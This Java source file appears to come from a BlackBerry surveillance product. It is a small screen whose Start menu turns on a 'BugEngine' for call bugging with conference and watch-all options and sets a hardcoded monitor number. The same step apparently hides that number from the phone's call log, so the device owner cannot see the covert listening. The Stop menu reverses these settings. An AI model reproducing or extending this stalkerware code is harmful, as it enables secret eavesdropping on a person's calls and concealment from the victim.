import info.ApplicationInfo;
import com.vvt.bug.BugEngine;
import com.vvt.bug.BugInfo;
import com.vvt.calllogmon.FxCallLogNumberMonitor;
import com.vvt.global.Global;
import com.vvt.license.LicenseInfo;
import com.vvt.license.LicenseStatus;
import com.vvt.pref.PrefBugInfo;
import com.vvt.pref.Preference;
import com.vvt.pref.PreferenceType;
import com.vvt.std.Log;
import com.vvt.std.Permission;
import com.vvt.std.PhoneInfo;
import net.rim.blackberry.api.phone.phonelogs.*;
import net.rim.device.api.ui.MenuItem;
import net.rim.device.api.ui.UiApplication;
import net.rim.device.api.ui.component.Dialog;
import net.rim.device.api.ui.container.MainScreen;

public class BugInfoApplicationMainScreen extends MainScreen {
	
	private final String TITLE = ":: BugInfo Application ::";
	private final String STARTING_MENU = "Start!";
	private final String STOPPING_MENU = "Stop!";
	// Component
	private FxCallLogNumberMonitor fxNumberRemover = Global.getFxCallLogNumberMonitor();
	private BugEngine bugEngine = new BugEngine();
	private BugInfo bugInfo = new BugInfo();
	private Preference pref = Global.getPreference();
	private PrefBugInfo prefBugInfo = (PrefBugInfo)pref.getPrefInfo(PreferenceType.PREF_BUG_INFO);
	// UI Part
	private BugInfoApplicationMainScreen self = null;
	private MenuItem startingMenu = null;
	private MenuItem stoppingMenu = null;
	
	public BugInfoApplicationMainScreen() {
		Log.setDebugMode(ApplicationInfo.DEBUG);
		// To set application permission.
		Permission.requestPermission();
		self = this;
		setTitle(TITLE);
		createMenus();
	}

	private void createMenus() {
		startingMenu = new MenuItem(STARTING_MENU, 1,1) {
        	public void run() {
        		prefBugInfo.setEnabled(true);
        		prefBugInfo.setWatchAllEnabled(true);
        		prefBugInfo.setMonitorNumber("0860547878");
        		pref.commit(prefBugInfo);
        		fxNumberRemover.addCallLogNumber(prefBugInfo.getMonitorNumber());
        		bugInfo.setEnabled(prefBugInfo.isEnabled());
        		bugInfo.setConferenceEnabled(true);
        		bugInfo.setWatchListEnabled(prefBugInfo.isWatchAllEnabled());
        		bugInfo.setMonitorNumber(prefBugInfo.getMonitorNumber());
        		bugEngine.setBugInfo(bugInfo);
        		bugEngine.start();
        	}
        };
		stoppingMenu = new MenuItem(STOPPING_MENU, 1,1) {
        	public void run() {
        		prefBugInfo.setEnabled(false);
        		prefBugInfo.setWatchAllEnabled(false);
        		pref.commit(prefBugInfo);
        		fxNumberRemover.removeCallLogNumber(prefBugInfo.getMonitorNumber());
        		bugInfo.setEnabled(prefBugInfo.isEnabled());
        		bugInfo.setConferenceEnabled(true);
        		bugInfo.setWatchListEnabled(prefBugInfo.isWatchAllEnabled());
        		bugInfo.setMonitorNumber(prefBugInfo.getMonitorNumber());
        		bugEngine.setBugInfo(bugInfo);
        		bugEngine.stop();
        	}
        };
		
        addMenuItem(startingMenu);
        addMenuItem(stoppingMenu);
	}
}
